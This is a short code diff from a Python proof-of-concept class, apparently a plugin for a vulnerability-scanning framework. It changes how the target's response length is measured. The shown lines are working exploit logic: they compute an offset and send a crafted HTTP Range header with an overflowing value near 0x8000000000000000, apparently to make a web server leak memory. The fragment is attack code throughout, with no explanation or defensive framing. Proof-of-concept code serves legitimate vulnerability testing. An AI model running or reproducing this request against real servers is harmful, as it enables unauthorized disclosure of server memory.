@@ -51,7 +51,7 @@ class Poc(ABPoc):
             }
 
             offset = 605
-            file_len = len(requests.get(self.target, headers=headers).content)
+            file_len = len(requests.get(self.target, headers=headers).text)
             n = file_len + offset
             headers['Range'] = "bytes=-%d,-%d" % (n, 0x8000000000000000 - n)
             r = requests.get(self.target, headers=headers)
